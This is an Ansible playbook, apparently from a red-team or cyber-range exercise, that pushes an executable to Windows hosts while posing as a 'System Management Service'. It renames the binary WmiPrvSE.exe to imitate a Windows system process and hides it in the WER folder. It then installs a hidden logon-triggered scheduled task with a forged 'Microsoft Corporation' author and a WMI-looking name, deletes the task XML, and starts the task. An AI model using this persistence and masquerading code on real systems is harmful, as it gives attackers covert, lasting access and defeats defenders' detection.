---
- name: Deploy and Enroll System Management Service
  hosts: windows
  gather_facts: no
  vars:
    ansible_connection: winrm
    ansible_winrm_transport: ntlm
    ansible_winrm_server_cert_validation: ignore
    target_dir: 'C:\ProgramData\Microsoft\Windows\WER'

  tasks:
    - name: Ensure target directory exists
      ansible.windows.win_file:
        path: "{{ target_dir }}"
        state: directory

    - name: Drop the binary
      ansible.windows.win_copy:
        src: "files/proper.exe"
        dest: "{{ target_dir }}\\WmiPrvSE.exe"

    - name: Install Hidden Persistent Task
      ansible.windows.win_shell: |
        $stateFile = "C:\Users\charliebrown.TEAM1PEANUTS.000\AppData\Roaming\gundo\state.json"
        
        if (Test-Path $stateFile) {
            $taskXml = @'
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>WMI Performance Adapter</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>TEAM1\charliebrown</UserId>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>TEAM1\charliebrown</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{{ target_dir }}\WmiPrvSE.exe</Command>
      <Arguments>client</Arguments>
    </Exec>
  </Actions>
</Task>
'@
            $xmlPath = "$env:TEMP\wmi_task.xml"
            $taskXml | Out-File -FilePath $xmlPath -Encoding Unicode
            schtasks.exe /Create /TN "\Microsoft\Windows\WMI\WMI Performance Adapter" /XML $xmlPath /F
            Remove-Item $xmlPath -Force
            schtasks.exe /Run /TN "\Microsoft\Windows\WMI\WMI Performance Adapter"
            Write-Host "[+] Hidden task installed and started."
        } else {
            Write-Host "[-] Still cannot find state.json."
        }
      register: launch_result

    - name: Show result
      debug:
        msg: "{{ launch_result.stdout }}"
